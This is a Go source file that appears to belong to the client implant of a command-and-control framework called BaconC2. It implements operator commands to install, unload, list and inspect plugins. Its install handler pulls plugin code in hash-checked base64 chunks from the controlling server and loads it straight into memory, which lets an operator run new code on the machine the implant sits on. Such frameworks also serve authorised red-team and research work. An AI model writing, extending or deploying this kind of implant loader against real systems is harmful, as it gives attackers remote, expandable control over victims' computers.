package plugins

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"

	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/plugins"
)

type ClientPluginCommands struct {
	service *plugins.PluginService
	fetcher transport.IPluginFetcher
}

func NewPluginCommands(service *plugins.PluginService, fetcher transport.IPluginFetcher) *ClientPluginCommands {
	return &ClientPluginCommands{
		service: service,
		fetcher: fetcher,
	}
}

func (pc *ClientPluginCommands) HandlePluginInstall(cmd models.Command) models.CommandResult {
	if len(cmd.Args) < 1 {
		return errorResult(cmd.ID, "Error: plugin_install requires pluginName")
	}

	pluginName := cmd.Args[0]
	expectedHash := ""
	if len(cmd.Args) >= 2 {
		expectedHash = cmd.Args[1]
	}

	metadata, err := pc.fetchAndValidateMetadata(pluginName, expectedHash)
	if err != nil {
		return errorResult(cmd.ID, err.Error())
	}

	pluginData, err := pc.downloadPluginChunks(pluginName, metadata)
	if err != nil {
		return errorResult(cmd.ID, err.Error())
	}

	if err := pc.verifyAndLoadPlugin(pluginName, pluginData, metadata.Hash); err != nil {
		return errorResult(cmd.ID, err.Error())
	}

	return successResult(cmd.ID, fmt.Sprintf("Plugin '%s' installed successfully (%d bytes)", pluginName, len(pluginData)))
}

func (pc *ClientPluginCommands) fetchAndValidateMetadata(pluginName, expectedHash string) (*models.PluginTransferMetadata, error) {
	logging.Info("Fetching plugin metadata for '%s'", pluginName)
	metadata, err := pc.fetcher.FetchPluginMetadata(pluginName)
	if err != nil {
		return nil, fmt.Errorf("Failed to fetch plugin metadata: %v", err)
	}

	if expectedHash != "" && metadata.Hash != expectedHash {
		return nil, fmt.Errorf("Hash mismatch: expected %s, got %s", expectedHash, metadata.Hash)
	}

	return metadata, nil
}

func (pc *ClientPluginCommands) downloadPluginChunks(pluginName string, metadata *models.PluginTransferMetadata) ([]byte, error) {
	logging.Info("Downloading plugin '%s' in %d chunks", pluginName, metadata.TotalChunks)
	pluginData := make([]byte, 0, metadata.TotalSize)

	for i := 0; i < metadata.TotalChunks; i++ {
		chunkData, err := pc.fetchAndVerifyChunk(pluginName, i, metadata.TotalChunks)
		if err != nil {
			return nil, err
		}
		pluginData = append(pluginData, chunkData...)
	}

	return pluginData, nil
}

func (pc *ClientPluginCommands) fetchAndVerifyChunk(pluginName string, index, total int) ([]byte, error) {
	chunk, err := pc.fetcher.FetchPluginChunk(pluginName, index)
	if err != nil {
		return nil, fmt.Errorf("Failed to fetch chunk %d/%d: %v", index+1, total, err)
	}

	chunkData, err := base64.StdEncoding.DecodeString(chunk.Data)
	if err != nil {
		return nil, fmt.Errorf("Failed to decode chunk %d: %v", index+1, err)
	}

	chunkHash := fmt.Sprintf("%x", sha256.Sum256(chunkData))
	if chunkHash != chunk.Hash {
		return nil, fmt.Errorf("Chunk %d hash mismatch", index+1)
	}

	logging.Debug("Downloaded chunk %d/%d", index+1, total)
	return chunkData, nil
}

func (pc *ClientPluginCommands) verifyAndLoadPlugin(pluginName string, pluginData []byte, expectedHash string) error {
	actualHash := fmt.Sprintf("%x", sha256.Sum256(pluginData))
	if actualHash != expectedHash {
		return fmt.Errorf("Final hash mismatch: expected %s, got %s", expectedHash, actualHash)
	}

	if err := pc.service.LoadPluginFromBytes(pluginName, pluginData); err != nil {
		return fmt.Errorf("Failed to load plugin: %v", err)
	}

	return nil
}

func (pc *ClientPluginCommands) HandlePluginUnload(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return errorResult(cmd.ID, "Error: Plugin name required")
	}

	pluginName := cmd.Args[0]
	if err := pc.service.UnloadPlugin(pluginName); err != nil {
		return errorResult(cmd.ID, fmt.Sprintf("Failed to unload plugin '%s': %v", pluginName, err))
	}

	return successResult(cmd.ID, fmt.Sprintf("Plugin '%s' unloaded successfully", pluginName))
}

func (pc *ClientPluginCommands) HandlePluginList(cmd models.Command) models.CommandResult {
	plugins := pc.service.ListPlugins()
	if len(plugins) == 0 {
		return successResult(cmd.ID, "No plugins loaded")
	}
	return jsonResult(cmd.ID, plugins)
}

func (pc *ClientPluginCommands) HandlePluginStatus(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return errorResult(cmd.ID, "Error: Plugin name required")
	}

	pluginName := cmd.Args[0]
	status, err := pc.service.GetPluginStatus(pluginName)
	if err != nil {
		return errorResult(cmd.ID, fmt.Sprintf("Failed to get plugin status: %v", err))
	}

	return successResult(cmd.ID, fmt.Sprintf("Plugin '%s' status: %s", pluginName, status))
}

func (pc *ClientPluginCommands) HandlePluginInfo(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return errorResult(cmd.ID, "Error: Plugin name required")
	}

	pluginName := cmd.Args[0]
	plugin, exists := pc.service.GetStore().Get(pluginName)
	if !exists {
		return errorResult(cmd.ID, fmt.Sprintf("Plugin '%s' not found", pluginName))
	}

	return jsonResult(cmd.ID, plugin.GetMetadata())
}

func errorResult(cmdID, message string) models.CommandResult {
	return models.CommandResult{
		ID:         cmdID,
		Status:     models.CommandStatusFailed,
		Output:     message,
		ResultType: models.ResultTypeError,
	}
}

func successResult(cmdID, message string) models.CommandResult {
	return models.CommandResult{
		ID:         cmdID,
		Status:     models.CommandStatusCompleted,
		Output:     message,
		ResultType: models.ResultTypeText,
	}
}

func jsonResult(cmdID string, data interface{}) models.CommandResult {
	output, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return errorResult(cmdID, fmt.Sprintf("Failed to marshal data: %v", err))
	}
	return models.CommandResult{
		ID:         cmdID,
		Status:     models.CommandStatusCompleted,
		Output:     string(output),
		ResultType: models.ResultTypeJSON,
	}
}
